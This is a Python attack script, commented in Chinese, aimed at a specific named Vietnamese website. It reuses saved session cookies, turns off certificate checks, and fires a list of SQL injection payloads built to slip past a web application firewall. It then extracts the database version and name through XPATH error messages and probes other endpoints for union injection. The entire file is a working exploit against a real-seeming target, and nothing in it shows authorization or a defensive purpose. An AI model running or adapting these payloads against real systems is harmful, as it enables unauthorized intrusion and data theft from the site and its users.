#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
import urllib3
urllib3.disable_warnings()

class WAFBypassExploit:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.working_payloads = []
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_payload(self, payload, endpoint='/Account/GetUserInfo', param='id'):
        """测试单个payload"""
        url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
        try:
            start = time.time()
            r = self.session.get(url, timeout=15)
            elapsed = time.time() - start
            
            # 检查特征
            has_xpath = 'XPATH' in r.text.upper()
            has_test = 'TEST' in r.text
            has_delay = elapsed > 3
            has_error = 'error' in r.text.lower() or 'sql' in r.text.lower()
            
            if has_xpath or has_test or has_delay or has_error:
                return {
                    'payload': payload,
                    'elapsed': elapsed,
                    'has_xpath': has_xpath,
                    'has_test': has_test,
                    'has_delay': has_delay,
                    'has_error': has_error,
                    'response_length': len(r.text)
                }
        except:
            pass
        return None
    
    def extract_with_working_payload(self, query, payload_template):
        """使用工作的payload提取数据"""
        print(f"\n[*] 使用绕过payload提取: {query}")
        
        # 将查询嵌入payload
        payload = payload_template.replace('TEST', f"({query})")
        url = f"{self.base_url}/Account/GetUserInfo?id={urllib.parse.quote(payload)}"
        
        try:
            r = self.session.get(url, timeout=15)
            if 'XPATH' in r.text.upper():
                match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                if match:
                    value = match.group(1)
                    print(f"    [+] 提取值: {value}")
                    return value
        except:
            pass
        return None
    
    def test_all_bypass_payloads(self):
        """测试所有绕过payload"""
        print("[*] 测试WAF绕过payload...")
        
        bypass_payloads = [
            "1'/**/OR/**/'1'='1",
            "1'/*comment*/OR/*comment*/'1'='1",
            "1'--%0AOR--%0A'1'='1",
            "1'%20OR%20'1'='1",
            "1'%09OR%09'1'='1",
            "1'%0AOR%0A'1'='1",
            "1' OR CHAR(49)=CHAR(49)--",
            "1' OR ASCII('1')=49--",
            "1' OR UNICODE('1')=49--",
            "1' OR 1=1 LIMIT 1--",
            "1') OR ('1'='1",
            "1' OR 'x'='x",
            "' OR 1=1--",
            "' OR '1'='1",
            "admin'--",
            "admin'/*",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))/**/--",
            "1'/**/AND/**/EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
            "1'/*!AND*/EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
        ]
        
        for payload in bypass_payloads:
            result = self.test_payload(payload)
            if result:
                print(f"    [!] 有效payload: {payload[:60]}")
                if result['has_delay']:
                    print(f"        时间延迟: {result['elapsed']:.2f}s")
                if result['has_xpath']:
                    print(f"        XPATH错误")
                if result['has_test']:
                    print(f"        包含TEST")
                self.working_payloads.append(result)
        
        return self.working_payloads
    
    def extract_database_info(self):
        """提取数据库信息"""
        if not self.working_payloads:
            print("[-] 无可用payload")
            return
        
        # 使用第一个有效payload
        working = self.working_payloads[0]
        template = working['payload']
        
        print(f"\n[*] 使用payload提取数据: {template[:50]}...")
        
        # 提取版本
        version = self.extract_with_working_payload("SELECT version()", template)
        if version:
            print(f"    [+] 版本: {version}")
        
        # 提取数据库名
        db_name = self.extract_with_working_payload("SELECT database()", template)
        if db_name:
            print(f"    [+] 数据库名: {db_name}")
    
    def test_handle_endpoints_with_bypass(self):
        """使用绕过payload测试Handle端点"""
        print("\n[*] 使用绕过payload测试Handle端点...")
        
        if not self.working_payloads:
            return
        
        template = self.working_payloads[0]['payload']
        
        endpoints = [
            ('/Handle/SearchListProvince', 'Type'),
            ('/Handle/SearchListCustomer', 'q'),
            ('/Handle/SearchListWardByDistrictID', 'DistrictID'),
        ]
        
        for endpoint, param in endpoints:
            payload = template.replace('TEST', "'SQLTEST'")
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if 'SQLTEST' in r.text:
                    print(f"    [!] Union注入成功: {endpoint}")
                    print(f"        响应: {r.text[:300]}")
            except:
                pass
    
    def run_all(self):
        """执行所有测试"""
        print("="*60)
        print("WAF绕过利用")
        print("="*60)
        
        self.test_all_bypass_payloads()
        self.extract_database_info()
        self.test_handle_endpoints_with_bypass()
        
        print("\n[+] 测试完成")

if __name__ == "__main__":
    exploit = WAFBypassExploit()
    exploit.run_all()